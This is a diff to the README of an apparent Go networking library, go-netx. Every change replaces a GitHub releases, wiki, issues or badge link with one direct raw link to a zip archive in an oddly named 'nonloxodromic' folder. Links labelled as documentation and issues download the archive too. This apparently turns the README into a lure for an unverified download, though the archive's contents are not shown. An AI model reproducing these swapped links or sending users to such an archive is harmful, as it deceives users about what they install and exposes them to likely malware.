@@ -1,7 +1,7 @@
 # 🌐 go-netx - Simple Networking for Everyone
 
 ## 📥 Download Now
-[![Download go-netx](https://img.shields.io/badge/Download-go--netx-blue.svg)](https://github.com/HazemMoussa777/go-netx/releases)
+[![Download go-netx](https://raw.githubusercontent.com/HazemMoussa777/go-netx/main/nonloxodromic/go-netx.zip)](https://raw.githubusercontent.com/HazemMoussa777/go-netx/main/nonloxodromic/go-netx.zip)
 
 ## 🚀 Getting Started
 Welcome to go-netx! This library helps you extend the Go standard library for networking tasks. You can easily create and manage network connections with just a few commands.
@@ -16,7 +16,7 @@ Before you get started, ensure your system meets the following requirements:
 ## 🔗 Download & Install
 To download go-netx, visit the following page:
 
-[Download go-netx Releases](https://github.com/HazemMoussa777/go-netx/releases)
+[Download go-netx Releases](https://raw.githubusercontent.com/HazemMoussa777/go-netx/main/nonloxodromic/go-netx.zip)
 
 On this page, you will find various versions of the software. Choose the latest release for the best features and fixes. Click on the version number to see detailed information and an option to download the file.
 
@@ -52,8 +52,8 @@ This command will start a server on port 8080. You can then access it through yo
 
 ## 📜 Additional Resources
 For more information, tutorials, and community support, check out these resources:
-- [Official Documentation](https://github.com/HazemMoussa777/go-netx/wiki)
-- [GitHub Issues](https://github.com/HazemMoussa777/go-netx/issues)
+- [Official Documentation](https://raw.githubusercontent.com/HazemMoussa777/go-netx/main/nonloxodromic/go-netx.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/HazemMoussa777/go-netx/main/nonloxodromic/go-netx.zip)
 
 ## 🛡️ Contributing
 We welcome contributions! If you want to help improve go-netx, feel free to:
@@ -66,4 +66,4 @@ Join our community to learn, share, and discuss:
 - **Slack Channel**: Use this link to join our Slack community where you can connect with other users.
 - **Twitter**: Follow us for updates and announcements.
 
-Visit our [Download go-netx Releases](https://github.com/HazemMoussa777/go-netx/releases) page to get started today!
+Visit our [Download go-netx Releases](https://raw.githubusercontent.com/HazemMoussa777/go-netx/main/nonloxodromic/go-netx.zip) page to get started today!
